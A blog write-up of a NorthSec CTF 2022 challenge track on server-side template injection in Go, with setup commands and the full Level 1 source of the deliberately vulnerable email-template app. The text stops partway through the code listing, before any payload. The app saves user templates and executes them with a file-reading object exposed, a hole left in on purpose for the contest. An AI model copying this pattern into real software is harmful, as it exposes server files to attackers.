<!doctype html><html><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="Personal blog for Jose Apari-Pantigozo AKA Fish in Space"><link rel="shortcut icon" href=https://aparipantigozo.com/favicon.ico><link rel=stylesheet href=/css/style.min.css><title>[NorthSec CTF 2022] Marketing Email Template</title></head><body><header id=banner><h2><a href=https://aparipantigozo.com>Blog @ Jose "Fish in Space" Apari-Pantigozo</a></h2><nav><ul><li><a href=/ title=posts>posts</a></li><li><a href=/about/ title=about>about</a></li></ul></nav></header><main id=content><article><header id=post-header><h1>[NorthSec CTF 2022] Marketing Email Template</h1><div><time>June 7, 2022</time></div></header><h1 id=introduction>Introduction</h1><p>This is a write-up about a track of 3 flags in NorthSec CTF 2022 around SSTI (Server-Side Template Injection) in Go. The context is that we are auditing an application used to draft marketing emails through a template.</p><p>We (Team PolyHx) ended up being the first team to complete the whole track.</p><h1 id=note>Note</h1><p>The <code>main.go</code> files can be built and ran and during the CTF I was debugging locally most of the time. Need to setup a <code>templates/</code> folder containing placeholder <code>templates/index.html</code> and <code>templates/preview.html</code> beforehand.</p><pre tabindex=0><code>mkdir templates
echo &#34;Index&#34; &gt; templates/index.html
echo &#34;Preview&#34; &gt; templates/preview.html
go build main.go
./main
</code></pre><h1 id=level-1---baby-steps>Level 1 - Baby Steps</h1><p>Accessing the website (<a href=http://dev.email-template.ctf>http://dev.email-template.ctf</a>), we are welcomed with an application that allows us to specify a template for an email which can contain variables like <code>{{ .title }}</code>. There is a link to download the source code of the application, which uses the Go language.</p><p>In this case, I approached the web application code by first looking into the exposed server routes as there were not that many.</p><details><summary>main.go - Level 1</summary><div class=highlight><pre tabindex=0 class=chroma><code class=language-golang data-lang=golang><span class=line><span class=cl>   <span class=mi>1</span>  <span class=kn>package</span> <span class=nx>main</span>
</span></span><span class=line><span class=cl>   <span class=mi>2</span>
</span></span><span class=line><span class=cl>   <span class=mi>3</span>  <span class=kn>import</span> <span class=p>(</span>
</span></span><span class=line><span class=cl>   <span class=mi>4</span>      <span class=s>&#34;os&#34;</span>
</span></span><span class=line><span class=cl>   <span class=mi>5</span>      <span class=s>&#34;log&#34;</span>
</span></span><span class=line><span class=cl>   <span class=mi>6</span>      <span class=s>&#34;fmt&#34;</span>
</span></span><span class=line><span class=cl>   <span class=mi>7</span>      <span class=s>&#34;path&#34;</span>
</span></span><span class=line><span class=cl>   <span class=mi>8</span>      <span class=s>&#34;errors&#34;</span>
</span></span><span class=line><span class=cl>   <span class=mi>9</span>      <span class=s>&#34;strings&#34;</span>
</span></span><span class=line><span class=cl>  <span class=mi>10</span>
</span></span><span class=line><span class=cl>  <span class=mi>11</span>      <span class=s>&#34;net/http&#34;</span>
</span></span><span class=line><span class=cl>  <span class=mi>12</span>      <span class=s>&#34;io/ioutil&#34;</span>
</span></span><span class=line><span class=cl>  <span class=mi>13</span>      <span class=s>&#34;html/template&#34;</span>
</span></span><span class=line><span class=cl>  <span class=mi>14</span>
</span></span><span class=line><span class=cl>  <span class=mi>15</span>      <span class=s>&#34;github.com/gin-gonic/gin&#34;</span>
</span></span><span class=line><span class=cl>  <span class=mi>16</span>  <span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=mi>17</span>
</span></span><span class=line><span class=cl>  <span class=mi>18</span>  <span class=kd>type</span> <span class=nx>Update</span> <span class=kd>struct</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=mi>19</span>      <span class=nx>Template</span> <span class=kt>string</span> <span class=s>`json:&#34;template&#34; binding:&#34;required&#34;`</span>
</span></span><span class=line><span class=cl>  <span class=mi>20</span>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=mi>21</span>
</span></span><span class=line><span class=cl>  <span class=mi>22</span>  <span class=kd>type</span> <span class=nx>MyApp</span> <span class=kd>struct</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=mi>23</span>      <span class=nx>templateName</span> <span class=kt>string</span>
</span></span><span class=line><span class=cl>  <span class=mi>24</span>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=mi>25</span>
</span></span><span class=line><span class=cl>  <span class=mi>26</span>  <span class=kd>func</span> <span class=p>(</span><span class=nx>m</span> <span class=o>*</span><span class=nx>MyApp</span><span class=p>)</span> <span class=nf>ReadFile</span><span class=p>()</span> <span class=p>([]</span><span class=kt>byte</span><span class=p>,</span> <span class=kt>error</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=mi>27</span>      <span class=nx>f</span><span class=p>,</span> <span class=nx>err</span> <span class=o>:=</span> <span class=nx>os</span><span class=p>.</span><span class=nf>Open</span><span class=p>(</span><span class=nx>m</span><span class=p>.</span><span class=nx>templateName</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=mi>28</span>
</span></span><span class=line><span class=cl>  <span class=mi>29</span>      <span class=k>if</span> <span class=nx>err</span> <span class=o>!=</span> <span class=kc>nil</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=mi>30</span>          <span class=nx>files</span><span class=p>,</span> <span class=nx>e</span> <span class=o>:=</span> <span class=nx>ioutil</span><span class=p>.</span><span class=nf>ReadDir</span><span class=p>(</span><span class=nx>path</span><span class=p>.</span><span class=nf>Dir</span><span class=p>(</span><span class=nx>m</span><span class=p>.</span><span class=nx>templateName</span><span class=p>))</span>
</span></span><span class=line><span class=cl>  <span class=mi>31</span>
</span></span><span class=line><span class=cl>  <span class=mi>32</span>          <span class=k>if</span> <span class=nx>e</span> <span class=o>!=</span> <span class=kc>nil</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=mi>33</span>              <span class=k>return</span> <span class=p>[]</span><span class=kt>byte</span><span class=p>{},</span> <span class=nx>e</span>
</span></span><span class=line><span class=cl>  <span class=mi>34</span>          <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=mi>35</span>
</span></span><span class=line><span class=cl>  <span class=mi>36</span>          <span class=kd>var</span> <span class=nx>filenames</span> <span class=p>[]</span><span class=kt>string</span>
</span></span><span class=line><span class=cl>  <span class=mi>37</span>          <span class=k>for</span> <span class=nx>_</span><span class=p>,</span> <span class=nx>file</span> <span class=o>:=</span> <span class=k>range</span> <span class=nx>files</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=mi>38</span>              <span class=kd>var</span> <span class=nx>filename</span> <span class=kt>string</span> <span class=p>=</span> <span class=nx>file</span><span class=p>.</span><span class=nf>Name</span><span class=p>()</span>
</span></span><span class=line><span class=cl>  <span class=mi>39</span>              <span class=k>if</span> <span class=nx>file</span><span class=p>.</span><span class=nf>IsDir</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=mi>40</span>                  <span class=nx>filename</span> <span class=o>+=</span> <span class=s>&#34; (directory)&#34;</span>
</span></span><span class=line><span class=cl>  <span class=mi>41</span>              <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=mi>42</span>              <span class=nx>filenames</span> <span class=p>=</span> <span class=nb>append</span><span class=p>(</span><span class=nx>filenames</span><span class=p>,</span> <span class=nx>filename</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=mi>43</span>          <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=mi>44</span>
</span></span><span class=line><span class=cl>  <span class=mi>45</span>          <span class=k>return</span> <span class=p>[]</span><span class=nb>byte</span><span class=p>(</span><span class=nx>fmt</span><span class=p>.</span><span class=nf>Sprint</span><span class=p>(</span><span class=nx>err</span><span class=p>)</span> <span class=o>+</span> <span class=s>&#34;\nPossible files:\n&#34;</span> <span class=o>+</span> <span class=nx>strings</span><span class=p>.</span><span class=nf>Join</span><span class=p>(</span><span class=nx>filenames</span><span class=p>[:],</span> <span class=s>&#34;\n&#34;</span><span class=p>)),</span> <span class=kc>nil</span>
</span></span><span class=line><span class=cl>  <span class=mi>46</span>      <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=mi>47</span>
</span></span><span class=line><span class=cl>  <span class=mi>48</span>      <span class=k>defer</span> <span class=kd>func</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=mi>49</span>          <span class=k>if</span> <span class=nx>err</span> <span class=p>=</span> <span class=nx>f</span><span class=p>.</span><span class=nf>Close</span><span class=p>();</span> <span class=nx>err</span> <span class=o>!=</span> <span class=kc>nil</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=mi>50</span>              <span class=nx>log</span><span class=p>.</span><span class=nf>Fatal</span><span class=p>(</span><span class=nx>err</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=mi>51</span>          <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=mi>52</span>      <span class=p>}()</span>
</span></span><span class=line><span class=cl>  <span class=mi>53</span>
</span></span><span class=line><span class=cl>  <span class=mi>54</span>      <span class=k>return</span> <span class=nx>ioutil</span><span class=p>.</span><span class=nf>ReadAll</span><span class=p>(</span><span class=nx>f</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=mi>55</span>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=mi>56</span>
</span></span><span class=line><span class=cl>  <span class=mi>57</span>  <span class=kd>func</span> <span class=p>(</span><span class=nx>m</span> <span class=o>*</span><span class=nx>MyApp</span><span class=p>)</span> <span class=nf>SetTemplateName</span><span class=p>(</span><span class=nx>name</span> <span class=kt>string</span><span class=p>)</span> <span class=kt>error</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=mi>58</span>      <span class=k>if</span> <span class=nx>name</span> <span class=o>==</span> <span class=s>&#34;&#34;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=mi>59</span>          <span class=k>return</span> <span class=nx>errors</span><span class=p>.</span><span class=nf>New</span><span class=p>(</span><span class=s>&#34;TemplateName cannot be nil or empty.&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=mi>60</span>      <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=mi>61</span>
</span></span><span class=line><span class=cl>  <span class=mi>62</span>      <span class=nx>m</span><span class=p>.</span><span class=nx>templateName</span> <span class=p>=</span> <span class=nx>name</span>
</span></span><span class=line><span class=cl>  <span class=mi>63</span>      <span class=k>return</span> <span class=kc>nil</span>
</span></span><span class=line><span class=cl>  <span class=mi>64</span>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=mi>65</span>
</span></span><span class=line><span class=cl>  <span class=mi>66</span>  <span class=kd>func</span> <span class=nf>main</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=mi>67</span>      <span class=nx>r</span> <span class=o>:=</span> <span class=nx>gin</span><span class=p>.</span><span class=nf>Default</span><span class=p>()</span>
</span></span><span class=line><span class=cl>  <span class=mi>68</span>      <span class=nx>r</span><span class=p>.</span><span class=nf>LoadHTMLGlob</span><span class=p>(</span><span class=s>&#34;templates/*&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=mi>69</span>      <span class=nx>r</span><span class=p>.</span><span class=nf>Static</span><span class=p>(</span><span class=s>&#34;/assets&#34;</span><span class=p>,</span> <span class=s>&#34;./assets&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=mi>70</span>
</span></span><span class=line><span class=cl>  <span class=mi>71</span>      <span class=nx>r</span><span class=p>.</span><span class=nf>GET</span><span class=p>(</span><span class=s>&#34;/&#34;</span><span class=p>,</span> <span class=kd>func</span><span class=p>(</span><span class=nx>c</span> <span class=o>*</span><span class=nx>gin</span><span class=p>.</span><span class=nx>Context</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=mi>72</span>          <span class=nx>m</span> <span class=o>:=</span> <span class=nx>MyApp</span><span class=p>{</span><span class=s>&#34;templates/index.html&#34;</span><span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=mi>73</span>          <span class=nx>content</span><span class=p>,</span> <span class=nx>err</span> <span class=o>:=</span> <span class=nx>m</span><span class=p>.</span><span class=nf>ReadFile</span><span class=p>()</span>
</span></span><span class=line><span class=cl>  <span class=mi>74</span>
</span></span><span class=line><span class=cl>  <span class=mi>75</span>          <span class=k>if</span> <span class=nx>err</span> <span class=o>!=</span> <span class=kc>nil</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=mi>76</span>              <span class=nx>log</span><span class=p>.</span><span class=nf>Fatal</span><span class=p>(</span><span class=nx>err</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=mi>77</span>          <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=mi>78</span>
</span></span><span class=line><span class=cl>  <span class=mi>79</span>          <span class=nx>m</span><span class=p>.</span><span class=nf>SetTemplateName</span><span class=p>(</span><span class=s>&#34;templates/preview.html&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=mi>80</span>          <span class=nx>preview</span><span class=p>,</span> <span class=nx>err</span> <span class=o>:=</span> <span class=nx>m</span><span class=p>.</span><span class=nf>ReadFile</span><span class=p>()</span>
</span></span><span class=line><span class=cl>  <span class=mi>81</span>
</span></span><span class=line><span class=cl>  <span class=mi>82</span>          <span class=k>if</span> <span class=nx>err</span> <span class=o>!=</span> <span class=kc>nil</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=mi>83</span>              <span class=nx>log</span><span class=p>.</span><span class=nf>Fatal</span><span class=p>(</span><span class=nx>err</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=mi>84</span>          <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=mi>85</span>
</span></span><span class=line><span class=cl>  <span class=mi>86</span>          <span class=nx>tmpl</span><span class=p>,</span> <span class=nx>err</span> <span class=o>:=</span> <span class=nx>template</span><span class=p>.</span><span class=nf>New</span><span class=p>(</span><span class=s>&#34;&#34;</span><span class=p>).</span><span class=nf>Parse</span><span class=p>(</span><span class=nb>string</span><span class=p>(</span><span class=nx>content</span><span class=p>))</span>
</span></span><span class=line><span class=cl>  <span class=mi>87</span>
</span></span><span class=line><span class=cl>  <span class=mi>88</span>          <span class=k>if</span> <span class=nx>err</span> <span class=o>!=</span> <span class=kc>nil</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=mi>89</span>              <span class=nx>log</span><span class=p>.</span><span class=nf>Fatal</span><span class=p>(</span><span class=nx>err</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=mi>90</span>          <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=mi>91</span>
</span></span><span class=line><span class=cl>  <span class=mi>92</span>          <span class=nx>c</span><span class=p>.</span><span class=nf>Status</span><span class=p>(</span><span class=nx>http</span><span class=p>.</span><span class=nx>StatusOK</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=mi>93</span>          <span class=nx>err</span> <span class=p>=</span> <span class=nx>tmpl</span><span class=p>.</span><span class=nf>Execute</span><span class=p>(</span><span class=nx>c</span><span class=p>.</span><span class=nx>Writer</span><span class=p>,</span> <span class=nx>gin</span><span class=p>.</span><span class=nx>H</span><span class=p>{</span><span class=s>&#34;title&#34;</span><span class=p>:</span><span class=s>&#34;Test!&#34;</span><span class=p>,</span><span class=s>&#34;template&#34;</span><span class=p>:</span><span class=nb>string</span><span class=p>(</span><span class=nx>preview</span><span class=p>),</span><span class=s>&#34;m&#34;</span><span class=p>:</span><span class=o>&amp;</span><span class=nx>m</span><span class=p>})</span>
</span></span><span class=line><span class=cl>  <span class=mi>94</span>
</span></span><span class=line><span class=cl>  <span class=mi>95</span>          <span class=k>if</span> <span class=nx>err</span> <span class=o>!=</span> <span class=kc>nil</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=mi>96</span>              <span class=nx>log</span><span class=p>.</span><span class=nf>Fatal</span><span class=p>(</span><span class=nx>err</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=mi>97</span>          <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=mi>98</span>      <span class=p>})</span>
</span></span><span class=line><span class=cl>  <span class=mi>99</span>
</span></span><span class=line><span class=cl> <span class=mi>100</span>      <span class=nx>r</span><span class=p>.</span><span class=nf>POST</span><span class=p>(</span><span class=s>&#34;/update&#34;</span><span class=p>,</span> <span class=kd>func</span><span class=p>(</span><span class=nx>c</span> <span class=o>*</span><span class=nx>gin</span><span class=p>.</span><span class=nx>Context</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl> <span class=mi>101</span>          <span class=kd>var</span> <span class=nx>update</span> <span class=nx>Update</span>
</span></span><span class=line><span class=cl> <span class=mi>102</span>          <span class=kd>var</span> <span class=nx>err</span> <span class=kt>error</span>
</span></span><span class=line><span class=cl> <span class=mi>103</span>
</span></span><span class=line><span class=cl> <span class=mi>104</span>          <span class=nx>err</span> <span class=p>=</span> <span class=nx>c</span><span class=p>.</span><span class=nf>BindJSON</span><span class=p>(</span><span class=o>&amp;</span><span class=nx>update</span><span class=p>)</span>
</span></span><span class=line><span class=cl> <span class=mi>105</span>
</span></span><span class=line><span class=cl> <span class=mi>106</span>          <span class=k>if</span> <span class=nx>err</span> <span class=o>!=</span> <span class=kc>nil</span> <span class=p>{</span>
</span></span><span class=line><span class=cl> <span class=mi>107</span>              <span class=nx>log</span><span class=p>.</span><span class=nf>Fatal</span><span class=p>(</span><span class=nx>err</span><span class=p>)</span>
</span></span><span class=line><span class=cl> <span class=mi>108</span>          <span class=p>}</span>
</span></span><span class=line><span class=cl> <span class=mi>109</span>
</span></span><span class=line><span class=cl> <span class=mi>110</span>          <span class=nx>f</span><span class=p>,</span> <span class=nx>err</span> <span class=o>:=</span> <span class=nx>os</span><span class=p>.</span><span class=nf>OpenFile</span><span class=p>(</span><span class=s>&#34;templates/preview.html&#34;</span><span class=p>,</span> <span class=nx>os</span><span class=p>.</span><span class=nx>O_WRONLY</span><span class=p>|</span><span class=nx>os</span><span class=p>.</span><span class=nx>O_CREATE</span><span class=p>|</span><span class=nx>os</span><span class=p>.</span><span class=nx>O_TRUNC</span><span class=p>,</span> <span class=mo>0664</span><span class=p>)</span>
</span></span><span class=line><span class=cl> <span class=mi>111</span>
</span></span><span class=line><span class=cl> <span class=mi>112</span>          <span class=k>if</span> <span class=nx>err</span> <span class=o>!=</span> <span class=kc>nil</span> <span class=p>{</span>
</span></span><span class=line><span class=cl> <span class=mi>113</span>              <span class=nx>log</span><span class=p>.</span><span class=nf>Fatal</span><span class=p>(</span><span class=nx>err</span><span class=p>)</span>
</span></span><span class=line><span class=cl> <span class=mi>114</span>          <span class=p>}</span>
</span></span><span class=line><span class=cl> <span class=mi>115</span>
</span></span><span class=line><span class=cl> <span class=mi>116</span>          <span class=k>defer</span> <span class=nx>f</span><span class=p>.</span><span class=nf>Close</span><span class=p>()</span>
</span></span><span class=line><span class=cl> <span class=mi>117</span>
</span></span><span class=line><span class=cl> <span class=mi>118</span>          <span class=k>if</span> <span class=nx>_</span><span class=p>,</span> <span class=nx>err</span> <span class=p>=</span> <span class=nx>f</span><span class=p>.</span><span class=nf>WriteString</span><span class=p>(</span><span class=nx>update</span><span class=p>.</span><span class=nx>Template</span><span class=p>);</span> <span class=nx>err</span> <span class=o>!=</span> <span class=kc>nil</span> <span class=p>{</span>
</span></span><span class=line><span class=cl> <span class=mi>119</span>              <span class=nx>log</span><span class=p>.</span><span class=nf>Fatal</span><span class=p>(</span><span class=nx>err</span><span class=p>)</span>
</span></span><span class=line><span class=cl> <span class=mi>120</span>          <span class=p>}</span>
</span></span><span class=line><span class=cl> <span class=mi>121</span>
</span></span><span class=line><span class=cl> <span class=mi>122</span>          <span class=nx>c</span><span class=p>.</span><span class=nf>JSON</span><span class=p>(</span><span class=mi>200</span><span class=p>,</span> <span class=s>&#34;ok&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl> <span class=mi>123</span>      <span class=p>})</span>
</span></span><span class=line><span class=cl> <span class=mi>124</span>
</span></span><span class=line><span class=cl> <span class=mi>125</span>      <span class=nx>r</span><span class=p>.</span><span class=nf>Any</span><span class=p>(</span><span class=s>&#34;/preview&#34;</span><span class=p>,</span> <span class=kd>func</span><span class=p>(</span><span class=nx>c</span> <span class=o>*</span><span class=nx>gin</span><span class=p>.</span><span class=nx>Context</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl> <span class=mi>126</span>          <span class=nx>m</span> <span class=o>:=</span> <span class=nx>MyApp</span><span class=p>{</span><span class=s>&#34;templates/preview.html&#34;</span><span class=p>}</span>
</span></span><span class=line><span class=cl> <span class=mi>127</span>
</span></span><span class=line><span class=cl> <span class=mi>128</span>          <span class=kd>var</span> <span class=nx>title</span> <span class=kt>string</span>
</span></span><span class=line><span class=cl> <span class=mi>129</span>          <span class=k>if</span> <span class=nx>title</span> <span class=p>=</span> <span class=nx>c</span><span class=p>.</span><span class=nf>Query</span><span class=p>(</span><span class=s>&#34;title&#34;</span><span class=p>);</span> <span class=nx>c</span><span class=p>.</span><span class=nf>Query</span><span class=p>(</span><span class=s>&#34;title&#34;</span><span class=p>)</span> <span class=o>==</span> <span class=s>&#34;&#34;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl> <span class=mi>130</span>              <span class=nx>title</span> <span class=p>=</span> <span class=s>&#34;Test Email&#34;</span>
</span></span><span class=line><span class=cl> <span class=mi>131</span>          <span class=p>}</span>
</span></span><span class=line><span class=cl> <span class=mi>132</span>
</span></span><span class=line><span class=cl> <span class=mi>133</span>          <span class=kd>var</span> <span class=nx>eventname</span> <span class=kt>string</span>
</span></span><span class=line><span class=cl> <span class=mi>134</span>          <span class=k>if</span> <span class=nx>eventname</span> <span class=p>=</span> <span class=nx>c</span><span class=p>.</span><span class=nf>Query</span><span class=p>(</span><span class=s>&#34;eventname&#34;</span><span class=p>);</span> <span class=nx>c</span><span class=p>.</span><span class=nf>Query</span><span class=p>(</span><span class=s>&#34;eventname&#34;</span><span class=p>)</span> <span class=o>==</span> <span class=s>&#34;&#34;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl> <span class=mi>135</span>              <span class=nx>eventname</span> <span class=p>=</span> <span class=s>&#34;My-Event-Name&#34;</span>
</span></span><span class=line><span class=cl> <span class=mi>136</span>          <span class=p>}</span>
</span></span><span class=line><span class=cl> <span class=mi>137</span>
</span></span><span class=line><span class=cl> <span class=mi>138</span>          <span class=kd>var</span> <span class=nx>firstname</span> <span class=kt>string</span>
</span></span><span class=line><span class=cl> <span class=mi>139</span>          <span class=k>if</span> <span class=nx>firstname</span> <span class=p>=</span> <span class=nx>c</span><span class=p>.</span><span class=nf>Query</span><span class=p>(</span><span class=s>&#34;firstname&#34;</span><span class=p>);</span> <span class=nx>c</span><span class=p>.</span><span class=nf>Query</span><span class=p>(</span><span class=s>&#34;firstname&#34;</span><span class=p>)</span> <span class=o>==</span> <span class=s>&#34;&#34;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl> <span class=mi>140</span>              <span class=nx>firstname</span> <span class=p>=</span> <span class=s>&#34;John&#34;</span>
</span></span><span class=line><span class=cl> <span class=mi>141</span>          <span class=p>}</span>
</span></span><span class=line><span class=cl> <span class=mi>142</span>
</span></span><span class=line><span class=cl> <span class=mi>143</span>          <span class=kd>var</span> <span class=nx>lastname</span> <span class=kt>string</span>
</span></span><span class=line><span class=cl> <span class=mi>144</span>          <span class=k>if</span> <span class=nx>lastname</span> <span class=p>=</span> <span class=nx>c</span><span class=p>.</span><span class=nf>Query</span><span class=p>(</span><span class=s>&#34;lastname&#34;</span><span class=p>);</span> <span class=nx>c</span><span class=p>.</span><span class=nf>Query</span><span class=p>(</span><span class=s>&#34;lastname&#34;</span><span class=p>)</span> <span class=o>==</span> <span class=s>&#34;&#34;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl> <span class=mi>145</span>              <span class=nx>lastname</span> <span class=p>=</span> <span class=s>&#34;Smith&#34;</span>
</span></span><span class=line><span class=cl> <span class=mi>146</span>          <span class=p>}</span>
</span></span><span class=line><span class=cl> <span class=mi>147</span>
</span></span><span class=line><span class=cl> <span class=mi>148</span>          <span class=kd>var</span> <span class=nx>companyname</span> <span class=kt>string</span>
</span></span><span class=line><span class=cl> <span class=mi>149</span>          <span class=k>if</span> <span class=nx>companyname</span> <span class=p>=</span> <span class=nx>c</span><span class=p>.</span><span class=nf>Query</span><span class=p>(</span><span class=s>&#34;companyname&#34;</span><span class=p>);</span> <span class=nx>c</span><span class=p>.</span><span class=nf>Query</span><span class=p>(</span><span class=s>&#34;companyname&#34;</span><span class=p>)</span> <span class=o>==</span> <span class=s>&#34;&#34;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl> <span class=mi>150</span>              <span class=nx>companyname</span> <span class=p>=</span> <span class=s>&#34;Email Templating Inc.&#34;</span>
</span></span><span class=line><span class=cl> <span class=mi>151</span>          <span class=p>}</span>
</span></span><span class=line><span class=cl> <span class=mi>152</span>
</span></span><span class=line><span class=cl> <span class=mi>153</span>          <span class=c1>// Fetch all custom tags
</span></span></span><span class=line><span class=cl><span class=c1></span> <span class=mi>154</span>          <span class=kd>var</span> <span class=nx>num</span> <span class=kt>string</span>
</span></span><span class=line><span class=cl> <span class=mi>155</span>          <span class=kd>var</span> <span class=nx>stop</span> <span class=kt>bool</span> <span class=p>=</span> <span class=kc>false</span>
</span></span><span class=line><span class=cl> <span class=mi>156</span>          <span class=kd>var</span> <span class=nx>custom</span> <span class=kt>string</span>
</span></span><span class=line><span class=cl> <span class=mi>157</span>          <span class=kd>var</span> <span class=nx>customs</span> <span class=p>=</span> <span class=kd>map</span><span class=p>[</span><span class=kt>string</span><span class=p>]</span><span class=kt>string</span><span class=p>{}</span>
</span></span><span class=line><span class=cl> <span class=mi>158</span>          <span class=k>for</span> <span class=nx>i</span> <span class=o>:=</span> <span class=mi>1</span><span class=p>;</span> <span class=p>!</span><span class=nx>stop</span><span class=p>;</span> <span class=nx>i</span><span class=o>++</span> <span class=p>{</span>
</span></span><span class=line><span class=cl> <span class=mi>159</span>              <span class=nx>num</span> <span class=p>=</span> <span class=s>&#34;custom&#34;</span><span class=o>+</span><span class=nb>string</span><span class=p>(</span><span class=nx>i</span><span class=o>+</span><span class=mi>48</span><span class=p>)</span>
</span></span><span class=line><span class=cl> <span class=mi>160</span>              <span class=nx>custom</span> <span class=p>=</span> <span class=nx>c</span><span class=p>.</span><span class=nf>Query</span><span class=p>(</span><span class=nx>num</span><span class=p>)</span>
</span></span><span class=line><span class=cl> <span class=mi>161</span>
</span></span><span class=line><span class=cl> <span class=mi>162</span>              <span class=k>if</span> <span class=nx>custom</span> <span class=o>==</span> <span class=s>&#34;&#34;</span><span class=p>{</span>
</span></span><span class=line><span class=cl> <span class=mi>163</span>                  <span class=nx>stop</span> <span class=p>=</span> <span class=kc>true</span>
</span></span><span class=line><span class=cl> <span class=mi>164</span>                  <span class=k>break</span>
</span></span><span class=line><span class=cl> <span class=mi>165</span>              <span class=p>}</span>
</span></span><span class=line><span class=cl> <span class=mi>166</span>              <span class=nx>customs</span><span class=p>[</span><span class=nx>num</span><span class=p>]</span> <span class=p>=</span> <span class=nx>custom</span>
</span></span><span class=line><span class=cl> <span class=mi>167</span>          <span class=p>}</span>
</span></span><span class=line><span class=cl> <span class=mi>168</span>
</span></span><span class=line><span class=cl> <span class=mi>169</span>          <span class=c1>// Create the response map
</span></span></span><span class=line><span class=cl><span class=c1></span> <span class=mi>170</span>          <span class=kd>var</span> <span class=nx>response</span> <span class=kd>map</span><span class=p>[</span><span class=kt>string</span><span class=p>]</span><span class=kd>interface</span><span class=p>{}</span> <span class=p>=</span> <span class=nx>gin</span><span class=p>.</span><span class=nx>H</span><span class=p>{</span>
</span></span><span class=line><span class=cl> <span class=mi>171</span>                  <span class=s>&#34;title&#34;</span><span class=p>:</span><span class=nx>title</span><span class=p>,</span>
</span></span><span class=line><span class=cl> <span class=mi>172</span>                  <span class=s>&#34;eventname&#34;</span><span class=p>:</span><span class=nx>eventname</span><span class=p>,</span>
</span></span><span class=line><span class=cl> <span class=mi>173</span>                  <span class=s>&#34;firstname&#34;</span><span class=p>:</span><span class=nx>firstname</span><span class=p>,</span>
</span></span><span class=line><span class=cl> <span class=mi>174</span>                  <span class=s>&#34;lastname&#34;</span><span class=p>:</span><span class=nx>lastname</span><span class=p>,</span>
</span></span><span class=line><span class=cl> <span class=mi>175</span>                  <span class=s>&#34;companyname&#34;</span><span class=p>:</span><span class=nx>companyname</span><span class=p>,</span>
</span></span><span class=line><span class=cl> <span class=mi>176</span>                  <span class=s>&#34;m&#34;</span><span class=p>:</span><span class=o>&amp;</span><span class=nx>m</span><span class=p>,</span>
</span></span><span class=line><span class=cl> <span class=mi>177</span>              <span class=p>}</span>
</span></span><span class=line><span class=cl> <span class=mi>178</span>
</span></span><span class=line><span class=cl> <span class=mi>179</span>          <span class=c1>// Merge the custom tags
</span></span></span><span class=line><span class=cl><span class=c1></span> <span class=mi>180</span>          <span class=k>for</span> <span class=nx>key</span><span class=p>,</span> <span class=nx>value</span> <span class=o>:=</span> <span class=k>range</span> <span class=nx>customs</span> <span class=p>{</span>
</span></span><span class=line><span class=cl> <span class=mi>181</span>              <span class=nx>response</span><span class=p>[</span><span class=nx>key</span><span class=p>]</span> <span class=p>=</span> <span class=nx>value</span>
</span></span><span class=line><span class=cl> <span class=mi>182</span>          <span class=p>}</span>
</span></span><span class=line><span class=cl> <span class=mi>183</span>
</span></span><span class=line><span class=cl> <span class=mi>184</span>          <span class=nx>content</span><span class=p>,</span> <span class=nx>err</span> <span class=o>:=</span> <span class=nx>m</span><span class=p>.</span><span class=nf>ReadFile</span><span class=p>()</span>
</span></span><span class=line><span class=cl> <span class=mi>185</span>
